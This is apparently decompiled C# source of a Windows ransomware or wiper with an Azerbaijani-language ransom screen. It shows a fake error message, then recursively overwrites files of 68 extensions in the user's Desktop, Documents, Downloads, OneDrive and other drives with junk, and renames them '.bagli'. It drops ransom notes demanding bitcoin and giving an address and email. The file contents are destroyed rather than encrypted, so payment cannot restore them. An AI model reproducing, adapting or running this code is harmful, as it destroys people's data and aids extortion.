rcWgwoE1wqxEw79W4oCeE2Brwr3igLnDjlPCgcKdKH1ZbENNRsOAPsOMC8KkbOKAnTvigKByJMOWJSIDcMO5fyTCrgN4KcK1w6IlV8Kx4oChICbDquKAlDRJKCBUT8OKQ8aSwrlaPW9OxaF6wqzigKHigJ7CsXYzwqvigJ7FuBEYw5t3w43GksKdMMKnw7ZoVcKBw4fDvcOI4oCTdRTDgDf5wqYmwqhGwqXCtFFHY8Onw6kRbMOeRcKwBRd6KMO2w55Jw6ZpIMODxb7CpcKkDEjGkjPCrxXDh2XDnCvigJpRB1jDpMOIwqdSwrAwalLDo1PDmhNCw5/igKB3woHigJxXw6pqxbgYVEZyw5pAw4zigLBEwq1Sw5pHG0nCtsOTaTobwqjigLkoZ8OpeDXDqRvDkiJh4oCYw5nDggjFuGHDm8OeDsKgxZI5Z+KAnScRw6HDhmcuNUVPMxs7aEbigqzDqMOYw5zDinnCo+KAocOyH8OwIMOhwqh6w4dQXgpYG1omwpDCr+KAocOfcMKjw67CrlYl4oC54oCaLDlyEsK4wrZDwpDCpTbCrEYxAsOhBsaSTlsmasKmw5oDQlp6F8K9UBjDr+KAucOHwq7CqjNuJ24E4oC6G39VQsW+SMO6w6g5WcOGw50XWXfCgRDDs8K2fhZjw7TigKAM4oCTe8Onwp3igLrDnsKiy4Z04oCdwq4Mw61PwrxPw7DCj3kXw5rDqR4Zai7DqS0u4oCTwrs34oChKuKEoi3CncK7w4gjwo3DlsK4wrnigJjFvcK0w6QRBxHDguKAsMucPXnDnMO6CsOxw5FpGRzDsSDDuA==" };

	private string userName = Environment.UserName;

	private string userDir = "C:\\";

	private string[] messages = new string[9] { "Komputerinizdəki fayllar şifrələndi.", "Faylların bərpası üçün təqdim olunan bitkoin adresinə bitkoin göndərməyiniz xahiş olunur.", "Bərpa etmək üçün məbləği aşağıda göstərilmiş ünvana göndərin. Göndərdikdən sonra email vasitəsi ilə əlaqə saxlayın.", "Fayllara toxunmayın adlarını dəyişdirməyin əks təqdirdə biz belə faylları berpa edə bilməyəcəyik.", "Narahat olmayın ödənişdən sonra sizin fayllar qayıdacaqdır", "Ödəniş qiyməti:138$", "Bitcoin address: bc1qnurh904jcnxm0amfg2cy3406k4ed2vd2x67s8p", "Email: ramil.namazov.1992@outlook.com", "ID: 740682679" };

	private string[] validExtensions = new string[68]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".PDF", ".php",
		".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".XLSX", ".cs",
		".mp3", ".mp4", ".DOCX", ".dwg", ".DOC", ".zip", ".rar", ".mov", ".rtf", ".bmp",
		".mkv", ".avi", ".apk", ".lnk", ".iso", ".7-zip", ".ace", ".arj", ".bz2", ".cab",
		".gzip", ".lzh", ".tar", ".jpeg", ".xz", ".JPG", ".PNG", ".mpeg", ".mp3", ".mpg",
		".core", ".XLS", ".pdb", ".ico", ".pas", ".db", ".wmv", ".MP4"
	};

	private IContainer components = null;

	private Label label2;

	private Label label3;

	private TextBox textBox1;

	private TextBox textBox2;

	private Label label4;

	private Label label5;

	private PrintDialog printDialog1;

	private Button button1;

	private Timer timer1;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public Form2()
	{
		InitializeComponent();
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_ControlBox(false);
		((Form)this).set_ShowInTaskbar(false);
		MessageBox.Show("Unable to load file, an error occurred while loading a higher quality version of this it", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		startAction();
		((Form)this).set_Opacity(100.0);
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void label3_Click(object sender, EventArgs e)
	{
	}

	private void richTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Faylların bərpası üçün təqdim olunan bitkoin adresinə bitkoin göndərməyiniz xahiş olunur.");
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void EncryptFile(string file, string password)
	{
		Random random = new Random();
		int num = random.Next(0, 4);
		byte[] bytes = Encoding.UTF8.GetBytes(CreatePassword(5) + keys[num]);
		File.WriteAllBytes(file, bytes);
		File.Move(file, file + ".bagli");
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (validExtensions.Contains(extension) && fileName != "fayllari_qaytar.txt")
					{
						EncryptFile(files[i], password);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < directories.Length; i++)
			{
				try
				{
					encryptDirectory(directories[i], password);
					File.WriteAllLines(directories[i] + "/fayllari_qaytar.txt", messages);
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void startAction()
	{
		string password = CreatePassword(15);
		Directory_Settings_Sending(password);
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		string location = userDir + text + userName + "\\Desktop";
		string location2 = userDir + text + userName + "\\Links";
		string location3 = userDir + text + userName + "\\Contacts";
		string location4 = userDir + text + userName + "\\Desktop";
		string location5 = userDir + text + userName + "\\Documents";
		string location6 = userDir + text + userName + "\\Downloads";
		string location7 = userDir + text + userName + "\\Pictures";
		string location8 = userDir + text + userName + "\\Music";
		string location9 = userDir + text + userName + "\\OneDrive";
		string location10 = userDir + text + userName + "\\Saved Games";
		string location11 = userDir + text + userName + "\\Favorites";
		string location12 = userDir + text + userName + "\\Searches";
		string location13 = userDir + text + userName + "\\Videos";
		encryptDirectory(location, password);
		encryptDirectory(location2, password);
		encryptDirectory(location3, password);
		encryptDirectory(location4, password);
		encryptDirectory(location5, password);
		encryptDirectory(location6, password);
		encryptDirectory(location7, password);
		encryptDirectory(location8, password);
		encryptDirectory(location9, password);
		encryptDirectory(location10, password);
		encryptDirectory(location11, password);
		encryptDirectory(location12, password);
		encryptDirectory(location13, password);
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString(), password);
			}
		}
	}

	private void label4_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Expected O, but got Unknown
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		//IL_016c: Expected O, but got Unknown
		//IL_0200: Unknown result type (might be due to invalid IL or missing references)
		//IL_020a: Expected O, but got Unknown
		//IL_0291: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Expected O, but got Unknown
		//IL_0332: Unknown result type (might be due to invalid IL or missing references)
		//IL_033c: Expected O, but got Unknown
		//IL_03dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e6: Expected O, but got Unknown
		//IL_046f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0479: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		label2 = new Label();
		label3 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		label4 = new Label();
		label5 = new Label();
		printDialog1 = new PrintDialog();
		button1 = new Button();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Control)label2).set_Location(new System.Drawing.Point(4, 9));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(718, 40));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Komputerinizdəki fayllar şifrələndi. \r\nFaylların bərpası üçün təqdim olunan bitkoin adresinə bitkoin göndərməyiniz xahiş olunur.");
		label2.set_TextAlign((ContentAlignment)2);
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(SystemColors.ButtonFace);
		((Control)label3).set_Location(new System.Drawing.Point(12, 334));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(182, 29));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("Bitkoin Adresi:");
		((Control)label3).add_Click((EventHandler)label3_Click);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_Location(new System.Drawing.Point(223, 334));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(485, 26));
		((Control)textBox1).set_TabIndex(4);
		((Control)textBox1).set_Text("bc1qnurh904jcnxm0amfg2cy3406k4ed2vd2x67s8p");
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_Location(new System.Drawing.Point(16, 64));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		textBox2.set_ScrollBars((ScrollBars)2);
		((Control)textBox2).set_Size(new Size(692, 254));
		((Control)textBox2).set_TabIndex(5);
		((Control)textBox2).set_Text(componentResourceManager.GetString("textBox2.Text"));
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(SystemColors.ButtonFace);
		((Control)label4).set_Location(new System.Drawing.Point(12, 372));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(195, 29));
		((Control)label4).set_TabIndex(6);
		((Control)label4).set_Text("Ödəniş qiyməti:");
		((Control)label4).add_Click((EventHandler)label4_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.ButtonFace);
		((Control)label5).set_Location(new System.Drawing.Point(218, 372));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(69, 29));
		((Control)label5).set_TabIndex(7);
		((Control)label5).set_Text("138$");
		printDialog1.set_UseEXDialog(true);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new System.Drawing.Point(524, 368));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(184, 31));
		((Control)button1).set_TabIndex(8);
		((Control)button1).set_Text("Fayllarımı qaytar");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		timer1.set_Enabled(true);
		timer1.set_Interval(500);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(64, 64, 64));
		((Form)this).set_ClientSize(new Size(720, 420));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_MaximumSize(new Size(720, 420));
		((Control)this).set_MinimumSize(new Size(720, 420));
		((Control)this).set_Name("Form2");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form2");
		((Form)this).add_Load((EventHandler)Form2_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
